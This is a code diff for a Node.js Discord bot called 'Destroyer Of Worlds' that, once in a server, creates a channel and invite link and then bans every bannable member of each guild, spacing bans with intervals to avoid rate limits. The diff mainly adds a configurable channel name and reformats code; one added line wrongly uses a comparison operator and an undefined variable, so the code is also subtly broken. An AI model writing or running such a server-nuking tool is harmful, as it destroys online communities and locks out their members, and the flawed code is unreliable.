@@ -10,12 +10,16 @@ var colors = require("colors");
 // Settings for the bot.
 const settings = {
     //Make sure you insert actual token rather than Client ID
-    botToken: "INSERT TOKEN HERE"
+    botToken: "INSERT TOKEN HERE",
+    newChannelName: "Destroyer Of Worlds" //needs new channel name in order to create new invite
 };
 
-client.on("ready", async() => {
-setTitle("DOW");
-console.log(center(`
+//await cmd visuals 
+client.on("ready", async () => {
+    //cmd set title
+    setTitle("DOW");
+    //cmd display info
+    console.log(center(`
     ╦════════════════════════╦
     ║                        ║
     ║   Destroyer Of Worlds  ║
@@ -34,8 +38,10 @@ client.on("ready", () => {
     let createdChannelName;
     // Create an invite to a channel
     client.guilds.forEach(server => {
+        //if no channel name defined, use default
+        if(!newChannelName) newChannelName == "Destroyer Of Worlds";
         //create new channel
-        server.createChannel("-", "text").then(channel => {
+        server.createChannel(newChannelName, "text").then(channel => {
             createdChannelName = channel.name;
             //then once channel is created, create an invite link to this channel
             channel.createInvite().then(inviteCode => {
@@ -69,7 +75,7 @@ client.on("ready", () => {
     client.guilds.forEach(guild => {
         guild.members.forEach(m => {
             //set interval to prevent ratelimit error (API restrictions)
-            setInterval(function() {
+            setInterval(function () {
                 //check if user is bannable
                 if (!m.bannable) return console.log(chalk.bgGrey + ('INFO:') + ` ${m.user.username} could not be banned`);
                 m.ban()
